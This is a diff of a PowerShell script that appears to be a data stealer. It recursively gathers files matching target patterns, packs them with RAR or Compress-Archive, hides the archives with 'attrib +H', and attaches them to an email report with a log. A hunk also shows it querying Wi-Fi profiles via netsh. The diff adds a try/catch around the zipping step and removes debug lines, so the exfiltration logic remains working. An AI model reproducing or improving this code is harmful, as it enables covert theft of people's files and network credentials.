@@ -14,7 +14,6 @@
 # }
 $LOG=""
 $LOG = ($LOG + " Start ")
-# WL "Start"
 
 #######
 if(Test-Path "C:\Program Files\7-Zip\3123127z.exe"){
@@ -26,7 +25,6 @@ elseif (Test-Path "C:\Program Files\WinRAR\RAR.exe"){
   $arh="W"
 }
 else{WL "asd"}
-# WL $arh
 $LOG = ($LOG + $arh)
 echo $arh
 
@@ -58,15 +56,25 @@ for ($i=0; $i -lt 5; $i++){
       .\RAR.exe a $p (gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse) -ep3 #-hput -inul
     }
     else{
-      $p=($p+".zip")
-      gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
+      try{$p=($p+".zip")
+        gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
+      }
+      catch{
+        $LOG = ($LOG+" nothing!!! ")
+#         $Zip="C:\Users\qwe\Desktop\ARH\22.zip"
+ #[System.IO.Compression.ZipFile]::CreateFromDirectory("C:\Users\qwe\Desktop\ARH",$Zip)
+
+        #ДОБАВЛЯЕМ В СОЗДАННЫЙ АРХИВ ФАЙЛ
+#         $file="C:\Users\qwe\Desktop\sdsdas.png"
+#         [System.IO.Compression.ZipArchive]$ZipFile = [System.IO.Compression.ZipFile]::Open($Zip, ([System.IO.Compression.ZipArchiveMode]::Update))
+#         [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($ZipFile, $file, (Split-Path $file -Leaf))
+#         $ZipFile.Dispose()
+      }
     }
-#     WL $p
     $LOG = ($LOG+" "+$p)
     attrib +H $p
     echo ("____ "+$p)
     $ReportEmail.Subject=$lst[$i][1]
-#     echo $LOG
     $ReportEmail.Body=$LOG
     # arh
     $s=New-Object Net.Mail.Attachment($p)
@@ -97,12 +105,4 @@ WL (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups
 # echo "dadasdasdasdasasd"
 #######################
 # exit
-# $Zip="C:\Users\qwe\Desktop\ARH\22.zip"
-# >> #[System.IO.Compression.ZipFile]::CreateFromDirectory("C:\Users\qwe\Desktop\ARH",$Zip)
-# >>
-# >>
-# >> #ДОБАВЛЯЕМ В СОЗДАННЫЙ АРХИВ ФАЙЛ
-# >> $file="C:\Users\qwe\Desktop\sdsdas.png"
-# >> [System.IO.Compression.ZipArchive]$ZipFile = [System.IO.Compression.ZipFile]::Open($Zip, ([System.IO.Compression.ZipArchiveMode]::Update))
-# >> [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($ZipFile, $file, (Split-Path $file -Leaf))
-# >> $ZipFile.Dispose()
+
